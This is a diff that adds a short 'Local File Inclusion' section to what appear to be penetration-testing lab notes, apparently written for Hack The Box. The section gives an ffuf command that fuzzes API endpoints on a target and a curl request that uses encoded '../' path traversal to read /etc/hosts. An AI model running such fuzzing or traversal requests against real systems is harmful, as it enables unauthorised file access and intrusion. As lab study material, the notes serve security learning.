@@ -38,3 +38,8 @@ brute()
 ```
 
 
+# Local File Inclusion
+Check for the API Endpoints present using FFuF : `ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'`
+
+And then we can try to implement a basic LFI Attack : `curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"`
+
